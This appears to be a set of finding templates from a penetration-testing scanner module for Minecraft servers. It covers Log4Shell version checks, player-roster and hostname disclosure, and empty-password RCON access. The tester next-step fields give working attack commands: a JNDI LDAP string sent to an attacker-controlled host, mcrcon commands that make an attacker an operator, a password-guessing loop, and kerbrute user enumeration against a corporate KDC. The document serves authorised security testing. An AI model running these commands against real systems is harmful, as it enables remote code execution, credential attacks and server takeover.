summary: Minecraft Java Edition SLP with careful VarInt/JSON parsing. Log4Shell version-classification (T1 candidate — refuses to send JNDI). RCON companion probe on 25575 with empty-password Login (T2 — real Source-RCON handshake, request-id echo tells if accepted). MOTD FQDN + Forge mod inventory + player sample (T0/T1). Missing: crack-loop for weak RCON pw list, no active JNDI probe (correct per airgap).

findings.title_pattern: Minecraft server in Log4Shell-vulnerable version range (CVE-2021-44228)
findings.tier_evidence: Version-only classification — deterministic based on parsed Java Edition version 1.7-1.18.0. Does not send JNDI payload (would BE the exploit).
findings.promotion_notes: T2 promotion requires a JNDI callback probe — attacker-owned LDAP listener + ${jndi:ldap://…} chat/console send. Destructive and would count as active exploit.
findings.tester_next_step: # ROE-required: connect with a real MC client, send chat containing ${jndi:ldap://<controlled-host>/x}; watch controlled LDAP for JNDI lookup. On unpatched servers this is instant RCE.

findings.title_pattern: Minecraft SLP discloses player roster (usernames + UUIDs) unauthenticated
findings.tier_evidence: Real player sample entries returned in Status Response — deterministic, corp usernames = crown-jewel recon.
findings.promotion_notes: Feed usernames + UUIDs into known_users; correlate with AD sAMAccountName pattern for spray targets.
findings.tester_next_step: mcstatus IP:25565 status  # then for each username: kerbrute userenum against corp KDC

findings.title_pattern: Minecraft MOTD discloses internal hostnames / branding
findings.tier_evidence: FQDN-shaped tokens extracted from MOTD text.
findings.tester_next_step: mcstatus IP:25565 status  ; resolve any FQDN tokens against internal DNS

findings.tier_evidence: Source-RCON Login with empty password returned AUTH_RESPONSE with the original request-id — proof the login was ACCEPTED. Not a posture claim; a real credential.
findings.promotion_notes: Chain: send /op <attacker>, /execute, or /stop via a real command — full server control. Currently module refuses to send any command payload.
findings.tester_next_step: mcrcon -H IP -p '' -P 25575 list  ; mcrcon -H IP -p '' -P 25575 'op <attacker>' ; mcrcon -H IP -p '' -P 25575 'save-all' — ROE-required.

findings.promotion_notes: Add: hydra-style spray with common weak RCON passwords (minecraft, admin, changeme).
findings.tester_next_step: for pw in '' minecraft admin changeme rcon; do mcrcon -H IP -p "$pw" -P 25575 list && echo HIT $pw; done

findings.promotion_notes: Backend enum needs code execution on the proxy host.
findings.tester_next_step: # from a session on the proxy host: cat /opt/bungeecord/config.yml or /opt/velocity/velocity.toml

findings.title_pattern: Modded Minecraft server (Forge/Fabric) — mod inventory captured
findings.tester_next_step: mcstatus IP:25565 json  ; correlate each mod id + version against known modded-MC CVEs

findings.tier_evidence: Always emitted for a reachable server.
